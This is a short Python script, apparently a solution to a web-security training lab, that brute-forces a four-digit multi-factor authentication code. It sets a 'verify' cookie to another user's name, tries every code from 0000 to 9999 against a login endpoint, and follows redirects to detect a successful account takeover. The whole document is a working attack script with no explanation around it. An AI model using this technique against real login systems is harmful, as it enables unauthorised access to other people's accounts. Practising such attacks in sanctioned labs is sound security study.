import requests

# Target URL
url = "https://0a72000503b274f58041a3bd00c90066.web-security-academy.net/login2"

# Cookies
cookies = {
    "verify": "carlos",
    "session": "fdX9vdNcktCvXc8eMmqNgPWwE0TncyLL"
}

# Headers
headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Try codes 0000 to 9999
for i in range(10000):
    code = f"{i:04d}"
    data = {"mfa-code": code}

    print(f"\n[*] Trying code: {code}")
    response = requests.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=False)

    print(f"    Status: {response.status_code}")

    # If 302, follow redirect to get actual body content
    if response.status_code == 302:
        redirect_url = response.headers.get("Location")
        if redirect_url and not redirect_url.startswith("http"):
            # Handle relative redirects
            base_url = url.split("/login2")[0]
            redirect_url = base_url + redirect_url

        follow_up = requests.get(redirect_url, headers=headers, cookies=cookies)
        snippet = follow_up.text.strip().replace("\n", "")[:300]

        if "My Account" in follow_up.text:
            print(f"[✓] SUCCESS! Correct code: {code}")
            print(f"    Snippet: {snippet}")
            break
        else:
            print(f"[→] 302 redirect followed. Snippet: {snippet}")

    else:
        snippet = response.text.strip().replace("\n", "")[:300]
        print(f"    Snippet: {snippet}")

        if "too many" in snippet.lower():
            print("[!] Rate limit message detected! Consider pausing or slowing down.")

else:
    print("[x] Tried all codes. No valid MFA code found.")
